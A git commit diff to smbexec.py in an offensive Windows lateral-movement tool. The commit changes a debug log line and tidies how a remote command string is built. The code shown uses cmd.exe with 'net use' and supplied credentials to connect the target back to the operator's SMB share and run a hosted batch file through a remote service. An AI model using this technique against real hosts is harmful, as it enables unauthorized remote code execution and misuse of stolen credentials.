77d722d0ae58d530842f723ac7702bc3683b947c
awsm <ryan.preston.01@gmail.com>
2019-08-28 15:21:23 -0500

    Update smbexec.py

--- cmx/protocols/smb/smbexec.py
+++ cmx/protocols/smb/smbexec.py
@@ -108,11 +108,11 @@ class SMBEXEC:
         with open((cfg.TMP_PATH / self.__batchFile), 'w') as batch_file:
             batch_file.write(command)
 
-        logging.debug('Hosting batch file with command: ' + command)
+        logging.debug('Hosting batch file({}) with command: {}'.format(str(cfg.TMP_PATH / self.__batchFile), command))
 
-        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip,self.__share_name, self.__batchFile)
+        command = self.__shell + '\\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__batchFile)
         #adding creds gets past systems disallowing guest-auth
-        command = '%COMSPEC% /Q /c "net use /persistent:no \\\\{}\\{} /user:{} {} & '.format(local_ip, self.__share_name, self.__username, self.__password) + command
+        command = '%COMSPEC% /Q /c "net use /persistent:no \\\\{}\\{} /user:{} {} & {}'.format(local_ip, self.__share_name, self.__username, self.__password, command)
         logging.debug('Command to execute: ' + command)
 
         logging.debug('Remote service {} created.'.format(self.__serviceName))
